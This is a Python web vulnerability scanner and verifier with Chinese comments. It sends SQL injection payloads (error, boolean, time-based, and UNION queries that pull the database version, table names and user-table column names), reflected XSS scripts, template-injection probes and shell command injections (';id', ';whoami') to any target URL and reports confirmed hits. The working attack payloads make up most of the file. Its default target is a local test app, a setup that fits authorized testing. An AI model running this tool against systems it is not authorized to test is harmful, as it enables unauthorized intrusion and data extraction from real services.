#!/usr/bin/env python3
"""
Ember 响应分析器 v2 — 从"检测"到"验证"。

升级: 不只是检测异常,而是验证漏洞确实存在。
  - SQLi: 用 UNION SELECT 提取数据库版本、表名、行数
  - XSS:  检查 payload 是否真的出现在响应 DOM 中 (反射验证)
  - SSTI: 用 {{7*7}} 检测数学结果 49
  - CMDi: 用 ;id 检测返回的实际用户名
  - Time-based: 精确计时 + 统计基准

用法:
  from web.analyzer import ResponseAnalyzer
  analyzer = ResponseAnalyzer(target)
  result = analyzer.verify_sqli("/search", "q")
"""

import re, time, json
from typing import Dict, List, Tuple, Optional
from urllib.request import Request, urlopen, HTTPError
from urllib.error import URLError
from urllib.parse import quote


class ResponseAnalyzer:
    """漏洞验证引擎 — 从可疑 → 确认."""

    def __init__(self, target: str, timeout: int = 15):
        self.target = target.rstrip("/")
        self.timeout = timeout

    def _req(self, method: str, path: str, params: Optional[Dict] = None,
             data: Optional[str] = None, ct: str = "application/x-www-form-urlencoded",
             headers: Optional[Dict] = None) -> Tuple[int, str, float]:
        url = self.target + path
        if params:
            url += "?" + "&".join(f"{quote(str(k))}={quote(str(v))}" for k, v in params.items())
        req = Request(url, data=data.encode() if data else None, method=method)
        req.add_header("Content-Type", ct)
        req.add_header("User-Agent", "Ember-Analyzer/2.0")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        t0 = time.monotonic()
        try:
            resp = urlopen(req, timeout=self.timeout)
            return resp.status, resp.read().decode(errors="replace"), time.monotonic() - t0
        except HTTPError as e:
            return e.code, e.read().decode(errors="replace"), time.monotonic() - t0
        except URLError as e:
            return 0, str(e.reason), 0

    def _baseline(self, path: str, param: str = "q", method: str = "GET") -> Tuple[str, float, int]:
        """建立基线: 正常请求的响应 + 响应时间 + 响应长度."""
        safe_val = "test-safe-baseline-123"
        _, body, elapsed = self._req(method, path, params={param: safe_val})
        return body, elapsed, len(body)

    # ── SQLi 验证 ──

    def verify_sqli(self, path: str, param: str = "q", method: str = "GET") -> Dict:
        """多级验证 SQL 注入 — 从检测到数据提取."""
        safe_body, safe_time, safe_len = self._baseline(path, param, method)
        verdicts = []

        # Level 1: Error-based
        error_payloads = ["'", '"', "' OR '1'='1", "1' AND 1=CAST(@@version AS INT)--"]
        for p in error_payloads:
            _, body, elapsed = self._req(method, path, params={param: p})
            errors = self._scan_errors(body, safe_body)
            if errors:
                verdicts.append({"level": "error-based", "confirmed": True,
                                 "errors": errors, "payload": p})

        # Level 2: Boolean-based
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"
        _, true_body, _ = self._req(method, path, params={param: true_payload})
        _, false_body, _ = self._req(method, path, params={param: false_payload})
        len_diff = abs(len(true_body) - len(false_body))
        if len_diff > 50:
            verdicts.append({"level": "boolean-based", "confirmed": True,
                             "true_len": len(true_body), "false_len": len(false_body),
                             "payload": true_payload})

        # Level 3: Time-based
        time_payloads = [
            ("1' AND SLEEP(3)--", 3.0), ("1' AND (SELECT SLEEP(3))--", 3.0),
            ("'; WAITFOR DELAY '00:00:03'--", 3.0),
        ]
        for p, expected_delay in time_payloads:
            _, _, elapsed = self._req(method, path, params={param: p})
            if elapsed > safe_time + 2.0:
                verdicts.append({"level": "time-based", "confirmed": True,
                                 "baseline_sec": round(safe_time, 2),
                                 "injected_sec": round(elapsed, 2),
                                 "payload": p})

        # Level 4: Union-based data extraction
        union_payloads = [
            "' UNION SELECT @@version--",
            "' UNION SELECT table_name FROM information_schema.tables LIMIT 1--",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name LIKE 'user%' LIMIT 1--",
        ]
        for p in union_payloads:
            _, body, _ = self._req(method, path, params={param: p})
            ext = self._extract_data(body, safe_body)
            if ext:
                verdicts.append({"level": "union-based", "confirmed": True,
                                 "extracted": ext, "payload": p})

        return {
            "vulnerable": len(verdicts) > 0,
            "confidence": "high" if any(v["level"] in ("union-based", "error-based") for v in verdicts) else "medium",
            "verdicts": verdicts,
        }

    def _scan_errors(self, body: str, safe_body: str) -> List[str]:
        errors = []
        patterns = [
            (r"SQL syntax.*MySQL", "MySQL"),
            (r"unrecognized token", "SQLite"),
            (r"PostgreSQL.*ERROR", "PostgreSQL"),
            (r"ORA-\d{5}", "Oracle"),
            (r"Microsoft OLE DB", "MSSQL"),
            (r"Unclosed quotation mark", "MSSQL/ODBC"),
            (r"Warning.*mysql_fetch", "PHP/MySQL"),
            (r"SQLSTATE\[\d+\]", "PDO"),
        ]
        for pat, db_type in patterns:
            if re.search(pat, body, re.IGNORECASE) and not re.search(pat, safe_body, re.IGNORECASE):
                errors.append(db_type)
        return errors[:3]

    def _extract_data(self, body: str, safe_body: str) -> Optional[str]:
        safe_words = set(safe_body.split())
        injected_words = set(body.split())
        diff = injected_words - safe_words
        candidates = [w for w in diff if len(w) > 5 and w not in ('', 'null', 'undefined')]
        return candidates[0] if candidates else None

    # ── XSS 验证 ──

    def verify_xss(self, path: str, param: str = "q", method: str = "GET") -> Dict:
        """验证反射型 XSS — payload 是否直接出现在响应 HTML 中."""
        safe_body, _, safe_len = self._baseline(path, param, method)

        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
        ]
        verdicts = []
        for p in payloads:
            _, body, _ = self._req(method, path, params={param: p})
            # 检查 payload 是否原样反射
            if p in body:
                verdicts.append({
                    "level": "reflected",
                    "confirmed": True,
                    "payload": p,
                    "reflected_in": "html_body",
                })
            # 检查 HTML 编码后的反射
            encoded = p.replace("<", "&lt;").replace(">", "&gt;")
            if encoded in body and p not in body:
                verdicts.append({
                    "level": "reflected_html_encoded",
                    "confirmed": False,  # 编码后不一定可执行
                    "payload": p,
                    "note": "HTML encoded — may not be executable",
                })

        return {
            "vulnerable": any(v["confirmed"] for v in verdicts),
            "confidence": "high" if any(v["level"] == "reflected" for v in verdicts) else "low",
            "verdicts": verdicts,
        }

    # ── SSTI 验证 ──

    def verify_ssti(self, path: str, param: str = "q", method: str = "GET") -> Dict:
        """验证 SSTI — 用 {{7*7}} 检测数学执行."""
        safe_body, _, safe_len = self._baseline(path, param, method)

        polyglot = "${{<%[%'\"}}%\\"
        _, polyglot_body, _ = self._req(method, path, params={param: polyglot})
        if polyglot_body == safe_body and len(polyglot_body) == safe_len:
            return {"vulnerable": False, "confidence": "low", "reason": "无任何模板引擎迹象"}

        engines = {
            "Jinja2/Python": ("{{7*7}}", "49"),
            "Twig/PHP": ("{{7*7}}", "49"),
            "Freemarker/Java": ("${7*7}", "49"),
            "ERB/Ruby": ("<%= 7*7 %>", "49"),
            "Velocity/Java": ("#set($x=7*7)$x", "49"),
            "Smarty/PHP": ("{7*7}", "49"),
        }

        verdicts = []
        for engine, (payload, expected) in engines.items():
            _, body, _ = self._req(method, path, params={param: payload})
            if expected in body:
                verdicts.append({"level": "confirmed", "engine": engine, "payload": payload})

        return {
            "vulnerable": len(verdicts) > 0,
            "confidence": "high" if verdicts else "low",
            "verdicts": verdicts,
        }

    # ── CMDi 验证 ──

    def verify_cmdi(self, path: str, param: str = "cmd", method: str = "GET") -> Dict:
        """验证命令注入 — 用 ;id 检测返回的用户名."""
        safe_body, safe_time, safe_len = self._baseline(path, param, method)

        payloads = [
            ("; id", r"uid=\d+"),
            ("; whoami", r"[\w-]+"),
            ("| id", r"uid=\d+"),
            ("; uname -a", r"Linux|Darwin"),
        ]
        verdicts = []
        for p, expected_pattern in payloads:
            _, body, elapsed = self._req(method, path, params={param: p})
            if re.search(expected_pattern, body) and not re.search(expected_pattern, safe_body):
                verdicts.append({"level": "confirmed", "payload": p,
                                 "matched": re.findall(expected_pattern, body)[:3]})

            # Time-based for blind CMDi
            if elapsed > safe_time + 2.0:
                verdicts.append({"level": "time-based-blind", "payload": p,
                                 "elapsed": round(elapsed, 2)})

        return {
            "vulnerable": len(verdicts) > 0,
            "confidence": "high" if verdicts else "low",
            "verdicts": verdicts,
        }

    # ── 全自动验证扫描 ──

    def auto_verify(self, spider_report: Dict) -> Dict:
        """根据 Spider 输出自动验证所有可疑端点."""
        findings = []
        endpoints = spider_report.get("endpoints", [])

        for ep in endpoints:
            path = ep["path"]
            params = ep.get("params", ["q"])
            if not params:
                params = ["q"]
            param = params[0]

            # SQLi
            sqli = self.verify_sqli(path, param)
            if sqli["vulnerable"]:
                findings.append({"type": "sqli", "path": path, "param": param, **sqli})

            # XSS
            xss = self.verify_xss(path, param)
            if xss["vulnerable"]:
                findings.append({"type": "xss", "path": path, "param": param, **xss})

            # SSTI
            ssti = self.verify_ssti(path, param)
            if ssti["vulnerable"]:
                findings.append({"type": "ssti", "path": path, "param": param, **ssti})

        return {
            "endpoints_tested": len(endpoints),
            "vulnerabilities_found": len(findings),
            "findings": findings,
        }


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="Ember 漏洞验证器")
    ap.add_argument("-t", "--target", default="http://localhost:3000")
    ap.add_argument("-p", "--path", default="/rest/products/search")
    ap.add_argument("--param", default="q")
    ap.add_argument("--verify", choices=["sqli","xss","ssti","cmdi","all"], default="all")
    args = ap.parse_args()

    analyzer = ResponseAnalyzer(args.target)

    if args.verify in ("sqli", "all"):
        r = analyzer.verify_sqli(args.path, args.param)
        print(f"SQLi: {r['confidence']} — {len(r['verdicts'])} 验证点")
        for v in r["verdicts"]:
            print(f"  [{v['level']}] {v.get('extracted',v.get('errors',v.get('payload','')))[:80]}")

    if args.verify in ("xss", "all"):
        r = analyzer.verify_xss(args.path, args.param)
        print(f"XSS: {'vulnerable' if r['vulnerable'] else 'not vulnerable'}")
        for v in r["verdicts"]:
            print(f"  [{v['level']}] {v['payload'][:60]}")

    if args.verify in ("ssti", "all"):
        r = analyzer.verify_ssti(args.path, args.param)
        print(f"SSTI: {'vulnerable' if r['vulnerable'] else 'not vulnerable'}")
        for v in r["verdicts"]:
            print(f"  [{v['engine']}] {v['payload']}")
